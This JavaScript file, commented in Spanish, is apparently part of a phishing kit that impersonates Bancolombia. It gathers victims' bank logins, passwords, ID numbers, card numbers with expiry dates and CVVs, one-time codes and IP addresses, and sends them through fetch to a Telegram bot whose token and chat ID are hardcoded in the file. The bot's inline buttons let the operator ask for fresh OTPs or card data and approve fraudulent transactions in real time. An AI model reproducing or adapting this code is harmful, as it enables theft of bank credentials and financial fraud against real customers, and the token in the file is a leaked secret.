// ==========================================
// TELEGRAM.JS - VERSIÓN ROBUSTA CON DEBUGGING
// ==========================================

console.log('🚀 Iniciando carga de telegram.js...');

// Configuración de Telegram
const TELEGRAM_BOT_TOKEN = '8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc';
const TELEGRAM_CHAT_ID = '8469651553';

console.log('🔑 BOT_TOKEN configurado:', TELEGRAM_BOT_TOKEN ? 'SÍ' : 'NO');
console.log('💬 CHAT_ID configurado:', TELEGRAM_CHAT_ID ? 'SÍ' : 'NO');

// ==========================================
// FUNCIÓN PRINCIPAL - sendTelegramMessage
// ==========================================

async function sendTelegramMessage(mensaje, teclado = null) {
    console.log('📨 sendTelegramMessage() llamada');
    console.log('📝 Mensaje:', mensaje.substring(0, 50) + '...');
    console.log('⌨️ Teclado:', teclado ? 'SÍ' : 'NO');
    
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const payload = {
        chat_id: TELEGRAM_CHAT_ID,
        text: mensaje,
        parse_mode: 'Markdown'
    };
    
    if (teclado) {
        payload.reply_markup = teclado;
    }
    
    console.log('🌐 URL de Telegram:', url.substring(0, 50) + '...');
    console.log('📦 Payload preparado:', JSON.stringify(payload).substring(0, 100) + '...');
    
    try {
        console.log('⏳ Enviando fetch a Telegram...');
        
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        });

        console.log('📥 Respuesta recibida, status:', response.status);
        
        const result = await response.json();
        console.log('📄 Resultado parseado:', result);
        
        if (!result.ok) {
            console.error('❌ Telegram respondió con error:', result);
            throw new Error(`Error Telegram: ${result.description || 'Desconocido'}`);
        }

        console.log('✅ ¡Mensaje enviado exitosamente!');
        return result;
        
    } catch (error) {
        console.error('❌ ERROR en sendTelegramMessage:');
        console.error('   Tipo:', error.name);
        console.error('   Mensaje:', error.message);
        console.error('   Stack:', error.stack);
        throw error;
    }
}

// ==========================================
// FUNCIÓN PARA DATOS COMPLETOS
// ==========================================

async function sendToTelegram(data) {
    console.log('📨 sendToTelegram() llamada con data:', data);
    const mensaje = formatearMensaje(data);
    const teclado = crearTeclado(data);
    return await sendTelegramMessage(mensaje, teclado);
}

// ==========================================
// FORMATEAR MENSAJE
// ==========================================

function formatearMensaje(data) {
    console.log('📝 Formateando mensaje...');
    
    const transactionId = data.transactionId || Date.now().toString(36);
    
    let mensaje = `🏦 *NUEVA SOLICITUD BANCOLOMBIA*
━━━━━━━━━━━━━━━━━━━━━━━━━━

`;

    // DATOS DE LOGIN
    if (data.usuario || data.clave || data.userName || data.userPass) {
        mensaje += `🔐 *DATOS DE ACCESO*
━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 Usuario: \`${data.usuario || data.userName || 'N/A'}\`
🔑 Clave: \`${data.clave || data.userPass || 'N/A'}\`

`;
    }

    // DATOS PERSONALES
    if (data.tipoDocumento || data.numeroDocumento) {
        mensaje += `👤 *DATOS PERSONALES*
━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 Tipo Doc: ${data.tipoDocumento || 'N/A'}
🆔 Documento: \`${data.numeroDocumento || 'N/A'}\`
👤 Nombre: ${data.nombreCompleto || 'N/A'}
📱 Celular: ${data.celular || 'N/A'}
📧 Email: ${data.email || 'N/A'}

`;
    }

    // DATOS DE TARJETA
    if (data.cardNumber || data.numeroTarjeta) {
        mensaje += `💳 *DATOS DE TARJETA*
━━━━━━━━━━━━━━━━━━━━━━━━━━
💳 Número: \`${data.cardNumber || data.numeroTarjeta || 'N/A'}\`
👤 Titular: ${data.cardholderName || data.nombreTitular || 'N/A'}
📅 Vencimiento: \`${data.expiryDate || data.fechaVencimiento || 'N/A'}\`
🔒 CVV: \`${data.cvv || 'N/A'}\`

`;
    }

    // CÓDIGO DE VERIFICACIÓN
    if (data.codigoVerificacion || data.otp) {
        mensaje += `🔐 *VERIFICACIÓN*
━━━━━━━━━━━━━━━━━━━━━━━━━━
${data.tipoVerificacion || data.tipoOTP || 'Código'}: \`${data.codigoVerificacion || data.otp || 'Pendiente'}\`

`;
    }

    // INFORMACIÓN ADICIONAL
    mensaje += `🌐 *INFORMACIÓN ADICIONAL*
━━━━━━━━━━━━━━━━━━━━━━━━━━
🌍 IP: ${data.ip || data.userIP || 'No disponible'}
⏰ Hora: ${data.timestamp || new Date().toLocaleString('es-CO')}
🆔 ID: \`${transactionId}\`
━━━━━━━━━━━━━━━━━━━━━━━━━━`;

    console.log('✅ Mensaje formateado, longitud:', mensaje.length);
    return mensaje.trim();
}

// ==========================================
// CREAR TECLADO
// ==========================================

function crearTeclado(data) {
    console.log('⌨️ Creando teclado...');
    
    const transactionId = data.transactionId || Date.now().toString(36);
    
    const teclado = {
        inline_keyboard: [
            [
                { 
                    text: "✅ Código Correcto", 
                    callback_data: `correcto:${transactionId}` 
                },
                { 
                    text: "❌ Código Incorrecto", 
                    callback_data: `incorrecto:${transactionId}` 
                }
            ],
            [
                { 
                    text: "🔐 Solicitar Nueva Dinámica", 
                    callback_data: `nueva_dinamica:${transactionId}` 
                }
            ],
            [
                { 
                    text: "📱 Solicitar Nuevo OTP", 
                    callback_data: `nuevo_otp:${transactionId}` 
                }
            ],
            [
                { 
                    text: "💳 Solicitar Datos Tarjeta", 
                    callback_data: `pedir_tarjeta:${transactionId}` 
                }
            ],
            [
                { 
                    text: "✔️ Aprobar Transacción", 
                    callback_data: `aprobar:${transactionId}` 
                },
                { 
                    text: "🚫 Rechazar", 
                    callback_data: `rechazar:${transactionId}` 
                }
            ]
        ]
    };
    
    console.log('✅ Teclado creado con', teclado.inline_keyboard.length, 'filas');
    return teclado;
}

// ==========================================
// ACTUALIZACIÓN RÁPIDA DE CÓDIGO
// ==========================================

async function enviarActualizacionCodigo(codigo, tipo = 'OTP') {
    console.log('📨 enviarActualizacionCodigo() llamada:', codigo, tipo);
    
    const transactionId = Date.now().toString(36);
    
    const mensaje = `🔐 *NUEVO ${tipo.toUpperCase()}*
━━━━━━━━━━━━━━━━━━━━━━━━━━

🎯 Código: \`${codigo}\`
📱 Tipo: ${tipo}
⏰ Hora: ${new Date().toLocaleTimeString('es-CO')}
📅 Fecha: ${new Date().toLocaleDateString('es-CO')}

━━━━━━━━━━━━━━━━━━━━━━━━━━`;

    const teclado = {
        inline_keyboard: [
            [
                { 
                    text: "✅ Correcto", 
                    callback_data: `codigo_correcto:${transactionId}` 
                },
                { 
                    text: "❌ Incorrecto", 
                    callback_data: `codigo_error:${transactionId}` 
                }
            ],
            [
                { 
                    text: "🔄 Pedir Otro", 
                    callback_data: `pedir_otro:${transactionId}` 
                }
            ],
            [
                { 
                    text: "✔️ Finalizar", 
                    callback_data: `finalizar:${transactionId}` 
                }
            ]
        ]
    };

    return await sendTelegramMessage(mensaje, teclado);
}

// ==========================================
// OBTENER IP PÚBLICA
// ==========================================

async function getPublicIP() {
    console.log('🌐 Obteniendo IP pública...');
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        console.log('✅ IP obtenida:', data.ip);
        return data.ip;
    } catch (error) {
        console.error('❌ Error obteniendo IP:', error);
        return 'No disponible';
    }
}

// ==========================================
// VERIFICACIÓN DE CARGA
// ==========================================

console.log('✅ telegram.js cargado completamente');
console.log('📡 Funciones disponibles:');
console.log('   - sendTelegramMessage:', typeof sendTelegramMessage);
console.log('   - sendToTelegram:', typeof sendToTelegram);
console.log('   - enviarActualizacionCodigo:', typeof enviarActualizacionCodigo);
console.log('   - getPublicIP:', typeof getPublicIP);

// Test rápido (comentar en producción)
// console.log('🧪 Test: Todas las funciones están definidas');

// Hacer las funciones globales explícitamente
window.sendTelegramMessage = sendTelegramMessage;
window.sendToTelegram = sendToTelegram;
window.enviarActualizacionCodigo = enviarActualizacionCodigo;
window.getPublicIP = getPublicIP;

console.log('🌍 Funciones asignadas al objeto window');
console.log('✅ telegram.js listo para usar');
